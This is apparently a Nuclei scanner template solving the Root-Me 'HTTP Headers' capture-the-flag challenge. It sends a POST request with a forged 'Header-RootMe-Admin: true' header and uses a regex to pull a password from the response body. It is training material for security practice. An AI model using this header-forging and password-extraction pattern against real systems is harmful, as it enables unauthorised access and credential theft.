id: HTTP-Headers

info:
  name: HTTP Headers
  author: Tomitom13
  severity: unknown
  tags: http,headers,rootme

requests:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Header-RootMe-Admin: "true"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "password"
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "password [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
